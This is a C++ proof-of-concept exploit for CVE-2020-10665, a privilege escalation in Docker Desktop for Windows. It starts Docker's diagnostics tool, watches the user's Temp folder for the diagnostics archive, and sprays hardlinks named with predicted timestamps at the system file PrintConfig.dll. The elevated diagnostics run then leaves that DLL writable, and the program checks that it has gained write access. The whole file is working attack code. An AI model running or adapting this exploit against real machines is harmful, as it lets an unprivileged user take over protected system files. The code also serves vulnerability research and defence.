// CVE-2020-10665.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "stdafx.h"

int main()
{
	LPCWSTR dllPath = L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64_a337db27fa50b915\\Amd64\\PrintConfig.dll";
	// Get path to temp folder
	PWSTR path_temp;
	HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path_temp);
	if (SUCCEEDED(hr)) {
		wprintf(L"%ls\n", path_temp);
	}
	std::filesystem::path path{ path_temp };
	CoTaskMemFree(path_temp);
	path += L"\\Temp\\";
	LPCWSTR pathc = path.c_str();

	printf("Watching %ls...\n", pathc);

	// Start docker diagnostics
	printf("Start docker diagnostics...\n");
	SHELLEXECUTEINFO shellExInfo;

	shellExInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	shellExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	shellExInfo.hwnd = NULL;
	shellExInfo.lpVerb = L"open";
	shellExInfo.lpFile = L"C:\\Program Files\\Docker\\Docker\\resources\\com.docker.diagnose.exe";
	shellExInfo.lpParameters = L"gather";
	shellExInfo.lpDirectory = NULL;
	shellExInfo.nShow = SW_SHOW;
	shellExInfo.hInstApp = NULL;

	ShellExecuteEx(&shellExInfo); // start process

	// Watch temp folder for new docker diagnostics zip file
	HANDLE handle = CreateFile(pathc,
		FILE_LIST_DIRECTORY,
		FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
		nullptr);
	if (handle == INVALID_HANDLE_VALUE) return -1;
	bool found = false;
	std::string folder;
	while (found == false) {
		const int MAX_BUFFER = 1024;
		BYTE Buffer[MAX_BUFFER];
		DWORD dwBytesReturned = 0;

		ReadDirectoryChangesW(handle,
			Buffer,
			MAX_BUFFER,
			TRUE,
			FILE_NOTIFY_CHANGE_FILE_NAME,
			&dwBytesReturned,
			0,
			0);

		// Cast the buffer as Notification Struct.
		FILE_NOTIFY_INFORMATION* pNotifyInfo =
			(FILE_NOTIFY_INFORMATION*)(Buffer);

		// Convert pNotifyInfo->FileName to string
		std::wstring ws(pNotifyInfo->FileName);
		std::string fileName(ws.begin(), ws.end());

		std::smatch matches;
		if (std::regex_search(fileName, matches, std::regex(R"([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}\\\d{14}\.zip)"))) {
			std::string match{ matches[0] };
			printf("Detected diagnostics file %s\n", match.c_str());
			folder = match.substr(0, 36);
			found = true;
		}
	}

	// Once GUID folder is found, stop diagnostics
	printf("Kill docker diagnostics...\n");
	TerminateProcess(shellExInfo.hProcess, 1);
	CloseHandle(shellExInfo.hProcess);
	Sleep(1000);

	std::wstring wfolder = std::wstring(folder.begin(), folder.end());
	path += wfolder; 

	// Spray hardlinks up to 60 seconds from current time
	printf("Spraying hardlinks...\n");
	time_t rawtime;
	time_t nexttime;
	struct tm timeinfo;
	char buffer[80];
	std::wstring wpath(path);
	time(&rawtime);

	for (int i = 0; i < 61; i++) {
		nexttime = rawtime + i;
		gmtime_s(&timeinfo, &nexttime);
		strftime(buffer, sizeof(buffer), "%Y%m%d%H%M%S", &timeinfo);
		std::string stringbuffer(buffer);
		std::wstring datestring(stringbuffer.begin(), stringbuffer.end());
		std::wstring hardlink = wpath + L"\\" + datestring + L".zip";
		printf("%ls\n", hardlink.c_str());
		if (CreateNativeHardlink(hardlink.c_str(), dllPath))
		{
			printf("Creating hardlink %ls...\n", hardlink.c_str());
		}
		else
		{
			printf("Error creating hardlink: %ls\n", GetErrorMessage().c_str());
			return 1;
		}
	}

	// Requires GUI start to run with Docker's elevated permissions
	std::cout << "Start Docker diagnostics from GUI. Once it finishes, enter any key and press enter to continue...\n";
	std::string t;
	std::cin >> t;

	printf("Checking read/write permissions...\n");
	if ((_waccess(dllPath, 2)) == -1) {
		printf("Failed to gain read/write permissions!\n");
		return 1;
	}
	printf("Gained read/write permissions!\n");

}